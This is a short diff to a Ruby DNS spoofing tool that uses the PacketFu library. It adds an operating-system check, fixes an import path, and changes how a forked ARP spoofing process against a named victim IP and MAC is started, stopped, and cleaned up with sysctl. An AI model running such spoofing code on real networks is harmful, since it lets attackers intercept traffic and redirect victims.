@@ -1,9 +1,19 @@
+# Module to determine OS type
+module OsType
+    def is_mac?
+        RUBY_PLATFORM.downcase.include?("darwin")
+    end
+    def is_linux?
+        RUBY_PLATFORM.downcase.include?("linux")
+    end
+end
+
 # Gems
 require 'rubygems'
 require 'packetfu'
 
 # Files
-require 'arpSpoof.rb'
+require './arpSpoof.rb'
 
 # Includes so we don't have to use fully qualified class names
 include PacketFu
@@ -41,15 +51,15 @@ class DnsSpoof
         
         # Create the ARP Spoofing process
         @pid = fork do
-            #Signal.trap("HUP") { puts "disable forwarding here"; exit }
+            Signal.trap("INT") { `sysctl -w net.inet.ip.forwarding=0`; exit }
             arp = ArpSpoof.new(@routerIP, @routerMAC, @victimIP, @victimMAC,
                                @interface, @ourInfo)
             arp.runspoof
         end
         
-        #sleep 20
-        #Process.kill("INT", @pid)
-        #Process.wait
+        sleep 5
+        Process.kill("INT", @pid)
+        Process.wait
         
         
     end
